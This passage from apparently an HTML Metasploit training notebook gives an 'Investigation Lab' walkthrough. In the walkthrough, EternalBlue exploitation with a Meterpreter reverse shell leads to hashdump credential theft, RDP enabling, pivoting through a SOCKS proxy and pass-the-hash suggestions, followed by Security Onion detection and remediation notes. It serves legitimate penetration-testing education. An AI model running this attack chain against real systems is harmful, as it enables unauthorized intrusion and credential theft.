+  <h3>MSF REST API (Metasploit Pro feature, limited in Framework)</h3>
+  <pre><code># Start RPC service
+msfrpcd -P yourpassword -S -a 127.0.0.1
+
+# Python interaction via pymetasploit3
+pip3 install pymetasploit3
+python3 << 'EOF'
+from pymetasploit3.msfrpc import MsfRpcClient
+client = MsfRpcClient('yourpassword', ssl=True)
+print(client.modules.exploits[:5])
+
+# Run a module
+exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
+exploit['RHOSTS'] = '192.168.56.30'
+exploit['LHOST'] = '192.168.56.10'
+payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
+job = exploit.execute(payload=payload)
+print(job)
+EOF</code></pre>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Getting Started with Resource Scripts</h4>
+      <ul>
+        <li>A resource script (<code>.rc</code> file) is just a series of msfconsole commands — write them exactly as you would type them interactively</li>
+        <li>Use <code>makerc filename.rc</code> to capture your current session commands as a reusable script automatically</li>
+        <li>Run a resource script at startup with <code>msfconsole -r script.rc</code> to pre-configure your environment</li>
+      </ul>
+      <pre><code>makerc setup_lab.rc               <span class="cm"># save current session commands</span>
+msfconsole -r setup_lab.rc        <span class="cm"># replay on next launch</span>
+resource setup_lab.rc             <span class="cm"># run script from inside msfconsole</span></code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>Writing Effective Automation Scripts</h4>
+      <ul>
+        <li>Set <code>ExitOnSession false</code> in handler scripts so the listener keeps running after the first session opens — essential for multi-target labs</li>
+        <li>Use <code>workspace -a name</code> at the top of every engagement script to ensure clean data separation</li>
+        <li>Chain auxiliary scan + exploit in a single resource script to automate the full discovery-to-shell workflow</li>
+      </ul>
+      <pre><code><span class="cm"># engagement.rc</span>
+workspace -a lab_20240315
+db_nmap -sC -sV 192.168.56.0/24
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.56.10
+set LPORT 4444
+set ExitOnSession false
+run -j</code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>MSF RPC API for Programmatic Control</h4>
+      <ul>
+        <li>Use <code>msfrpcd</code> with <code>pymetasploit3</code> to drive Metasploit from external Python scripts — enables integration with custom tooling and CI/CD pipelines</li>
+        <li>The RPC API provides programmatic access to all module, session, job, and database operations — enables building custom automation beyond what resource scripts support</li>
+        <li>Bind the RPC daemon to localhost only (<code>-a 127.0.0.1</code>) to prevent unauthorized access to the MSF instance</li>
+      </ul>
+      <pre><code>msfrpcd -P strongpassword -S -a 127.0.0.1  <span class="cm"># start RPC daemon, localhost only</span>
+pip3 install pymetasploit3
+python3 -c "
+from pymetasploit3.msfrpc import MsfRpcClient
+client = MsfRpcClient('strongpassword', ssl=True)
+print(client.modules.exploits[:3])
+"</code></pre>
+    </div>
+  </details>
+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════════ SECTION 11 -->
+<template id="tpl-lab">
+<article class="topic">
+  <h2>Investigation Lab — Full Exploitation Walkthrough</h2>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l3">L3 Network</span>
+    <span class="osi-chip l4">L4 Transport</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">The full lab walkthrough traverses all layers: L3 host discovery, L4 port scanning and SMB connection, L7 EternalBlue shellcode delivery, Meterpreter session management, and pivot routing into internal subnets.</span>
+  </div>
+  <div class="callout warn">
+    <strong>Authorized lab only.</strong> This walkthrough uses the isolated Host-Only VirtualBox network. All targets are intentionally vulnerable VMs owned by you. Never perform these steps on systems you don't own or without written authorization.
+  </div>
+
+  <h3>Lab Environment</h3>
+  <table>
+    <thead><tr><th>VM</th><th>IP</th><th>Config Notes</th></tr></thead>
+    <tbody>
+      <tr><td>Kali Linux</td><td>192.168.56.10</td><td>Metasploit attacker; Host-Only + NAT for updates</td></tr>
+      <tr><td>Windows 10 (lab)</td><td>192.168.56.30</td><td>SMBv1 enabled; MS17-010 unpatched; weak admin password</td></tr>
+      <tr><td>Security Onion</td><td>192.168.56.20</td><td>Monitors Host-Only interface; watch Suricata alerts</td></tr>
+    </tbody>
+  </table>
+
+  <h3>Step 1 — Discovery &amp; Validation</h3>
+  <pre><code>msfconsole -q
+
+# Create workspace
+workspace -a lab_win10
+
+# Scan target, store in DB
+db_nmap -sC -sV -p- 192.168.56.30
+
+# Check scan results
+services
+# 445/tcp open microsoft-ds Windows 10 SMB
+
+# Validate EternalBlue vulnerability
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 192.168.56.30
+run
+# [+] 192.168.56.30 - Host is likely VULNERABLE to MS17-010!</code></pre>
+
+  <h3>Step 2 — Set Up Handler &amp; Exploit</h3>
+  <pre><code"># Handler first (before exploit fires)
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.56.10
+set LPORT 4444
+set ExitOnSession false
+run -j
+
+# Switch to EternalBlue
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.56.30
+set LHOST 192.168.56.10
+set LPORT 4444
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+run
+
+# Expected output:
+# [*] 192.168.56.30:445 - Sending all but last fragment of exploit packet!
+# [*] 192.168.56.30:445 - Starting non-paged pool grooming
+# [*] Exploit completed, but no session was created. ← if this: try again
+# [*] Meterpreter session 1 opened   ← success!</code></pre>
+
+  <h3>Step 3 — Post-Exploitation</h3>
+  <pre><code># Verify access
+sessions -i 1
+meterpreter > getuid       # NT AUTHORITY\SYSTEM
+meterpreter > sysinfo      # OS + hostname
+
+# Migrate to stable process
+meterpreter > ps | grep -i explorer
+meterpreter > migrate 3120    # migrate to explorer.exe PID
+
+# Dump local credentials
+meterpreter > hashdump
+# Administrator:500:aad3b435b51404eeaad3b435b51404ee:NTLMHASH:::
+
+# Enumerate
+run post/windows/gather/enum_logged_on_users
+run post/windows/gather/enum_applications
+
+# Enable persistence for next exercise
+run post/windows/manage/enable_rdp</code></pre>
+
+  <h3>Step 4 — Pivot to Internal Network</h3>
+  <pre><code"># Discover adjacent networks from compromised host
+meterpreter > ipconfig
+# New interface: 192.168.100.1 (internal network!)
+
+# Add route through session
+background
+route add 192.168.100.0/24 1
+
+# Scan internal network through pivot
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.100.0/24
+set PORTS 22,80,445,3389,8080
+set THREADS 20
+run
+
+# Start SOCKS proxy for non-MSF tools
+use auxiliary/server/socks_proxy
+set SRVPORT 1080
+set VERSION 5
+run -j
+
+# Now use proxychains for any tool
+# proxychains nmap -sT -Pn 192.168.100.10</code></pre>
+
+  <h3>Step 5 — Blue Team Observations (Security Onion)</h3>
+  <pre><code"># Expected Security Onion alerts during this lab:
+# - ET EXPLOIT MS17-010 EternalBlue Remote Code Execution Attempt
+# - ET TROJAN Meterpreter Reverse TCP Shell
+# - Suricata: SCAN Masscan detected (from Step 4 pivot scan)
+
+# Zeek conn.log shows:
+# 192.168.56.10 → 192.168.56.30:445 with large orig_bytes (exploit payload)
+# 192.168.56.30 → 192.168.56.10:4444 (reverse TCP Meterpreter connection)
+
+# Key lesson: even "encrypted" Meterpreter traffic has timing patterns
+# that behavioral analytics can identify
+
+# Remediation actions:
+# 1. Apply KB4012212 (MS17-010 patch)
+# 2. Disable SMBv1: Set-SmbServerConfiguration -EnableSMB1Protocol $false
+# 3. Block inbound SMB at perimeter
+# 4. Segment network (Windows machines should not reach Kali subnet)
+# 5. Deploy EDR with behavioral detection</code></pre>
+
+  <div class="callout lab">
+    <strong>Lab Extensions:</strong> Try passing the dumped NTLM hash with psexec to other hosts. Use local_exploit_suggester to find additional privilege escalation paths. Set up Metasploitable 2 (192.168.56.40) for Linux-based exploitation practice with different module classes.
+    <a href="#" class="xref" onclick="loadTopic('exploits'); return false;">Exploit module reference ↗</a>
+    <a href="#" class="xref" onclick="loadTopic('pivoting'); return false;">Pivoting techniques ↗</a>
+  </div>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Running the Full EternalBlue Attack Chain</h4>
+      <ul>
+        <li>Always run the auxiliary check module first — confirm MS17-010 vulnerability at L4 port 445 before running the exploit</li>
+        <li>Create a workspace, run <code>db_nmap</code>, and verify discovered services before selecting a module</li>
+        <li>After exploitation, immediately run <code>getuid</code> and <code>sysinfo</code> to confirm access level and target identity</li>
+      </ul>
+      <pre><code>workspace -a lab_win10
+db_nmap -sC -sV -p 22,80,445,3389 192.168.56.30
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 192.168.56.30
+run                               <span class="cm"># confirm: Host is likely VULNERABLE</span>
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.56.30
+set LHOST 192.168.56.10
+run</code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>Post-Exploitation and Pivoting</h4>
+      <ul>
+        <li>After getting SYSTEM on 192.168.56.30, run <code>hashdump</code> and <code>enum_logged_on_users</code> before pivoting to maximize value from the foothold</li>
+        <li>Use <code>autoroute</code> to discover all subnets visible from the pivot host rather than manually guessing internal network ranges</li>
+        <li>Start SOCKS proxy before scanning the internal subnet so non-MSF tools (Nmap, CrackMapExec) can also reach the internal network</li>
+      </ul>
+      <pre><code>meterpreter > hashdump            <span class="cm"># capture hashes before pivoting</span>
+meterpreter > run post/multi/manage/autoroute SET CMD=add
+background
+use auxiliary/server/socks_proxy
+set SRVPORT 1080
+run -j
+proxychains nmap -sT -Pn 192.168.100.0/24</code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>Blue Team Detection — What Security Onion Sees</h4>
+      <ul>
+        <li>Monitor Security Onion Suricata alerts during the lab: EternalBlue, Meterpreter staging, and pivot scan signatures all fire as distinct alert categories</li>
+        <li>Zeek <code>conn.log</code> on 192.168.56.20 shows the exact moment of exploitation: large <code>orig_bytes</code> on port 445 then a reverse connection from 192.168.56.30 to port 4444</li>
+        <li>After completing the lab, apply the MS17-010 patch (<code>KB4012212</code>) and disable SMBv1 — verify Security Onion no longer alerts on rescan</li>
+      </ul>
+      <pre><code><span class="cm"># After lab — remediation and verification</span>
+<span class="cm"># On Windows target (PowerShell):</span>
+Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
+<span class="cm"># Re-run auxiliary check after patch:</span>
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 192.168.56.30
+run                               <span class="cm"># should show: NOT vulnerable</span></code></pre>
+    </div>
+  </details>
+</article>
+</template>
+
+<script>
+window.NOTEBOOK = {
+  title: 'Metasploit',
+  topics: [
+    { id: 'overview',   badge: '01', label: 'Overview & Architecture'      },
+    { id: 'msfconsole', badge: '02', label: 'msfconsole Workflow'           },
+    { id: 'payloads',   badge: '03', label: 'Payloads & msfvenom'           },
+    { id: 'sessions',   badge: '04', label: 'Sessions & Meterpreter'        },
+    { id: 'auxiliary',  badge: '05', label: 'Auxiliary Modules'             },
+    { id: 'post',       badge: '06', label: 'Post-Exploitation Modules'     },
+    { id: 'pivoting',   badge: '07', label: 'Pivoting & Tunneling'          },
+    { id: 'exploits',   badge: '08', label: 'Notable Exploits'              },
+    { id: 'evasion',    badge: '09', label: 'Evasion Techniques'            },
+    { id: 'armitage',   badge: '10', label: 'Armitage & Automation'         },
+    { id: 'lab',        badge: '11', label: 'Investigation Lab'             },
+  ]
+};
+</script>
+<script src="js/app.js"></script>
+</body>
+</html>
